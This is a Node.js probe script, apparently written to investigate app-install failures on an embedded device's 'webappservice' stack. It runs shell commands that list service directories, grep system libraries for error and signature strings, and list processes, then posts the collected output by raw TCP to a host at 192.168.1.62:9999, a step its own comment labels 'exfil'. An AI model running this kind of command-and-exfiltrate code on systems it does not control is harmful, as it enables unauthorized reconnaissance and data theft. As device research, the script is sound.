"use strict";
/* p38: install forensics
   - /opt/share/webappservice/temp (stale state?)
   - WAS daemon binary + libs
   - strings: WAS_ERR / install error enum
   - exfil /p38info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p38', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p38info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'temp_dir', fn: function () { return run('ls -la /opt/share/webappservice/temp/ 2>&1; echo ---; find /opt/share/webappservice/temp -maxdepth 3 2>/dev/null | head -40', 20000); } },
  { name: 'wasd_dir', fn: function () { return run('ls -la /opt/usr/apps/webappservice/ 2>&1 | head -30', 15000); } },
  { name: 'wasd_bin', fn: function () { return run('find /opt/usr/apps/webappservice -maxdepth 2 -type f 2>/dev/null | head -20; echo ---; ls -la /usr/bin 2>/dev/null | grep -iE "was|webapp" | head -10', 20000); } },
  { name: 'strings_install', fn: function () {
      return run('for f in /usr/lib/libwas_db_api.so /usr/lib/libwas_inner_db.so /usr/lib/libwas_manager_api.so /usr/lib/libwas_util_api.so /usr/lib/libwebappenc.so.1 /usr/lib/libwas_launcher_api.so; do [ -f "$f" ] && echo "== $f" && strings "$f" 2>/dev/null | grep -iE "install.*fail|fail.*install|WAS_ERR|ERRCODE|signature|signature.*invalid|invalid.*signature" | sort -u | head -40; done', 40000);
  }},
  { name: 'strings_numbers', fn: function () {
      return run('for f in /usr/lib/libwas_db_api.so /usr/lib/libwas_inner_db.so /usr/lib/libwas_manager_api.so /usr/lib/libwas_util_api.so /usr/lib/libwebappenc.so.1 /usr/lib/libwas_launcher_api.so; do [ -f "$f" ] && echo "== $f" && strings "$f" 2>/dev/null | grep -E "118012|118019|118022|11802[0-9]|11801[0-9]" | head -10; done', 40000);
  }},
  { name: 'wasd_process', fn: function () { return run('ps -ef 2>/dev/null | grep -iE "webappservice|wasd|appbinary" | grep -v grep', 15000); } }
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 150000);
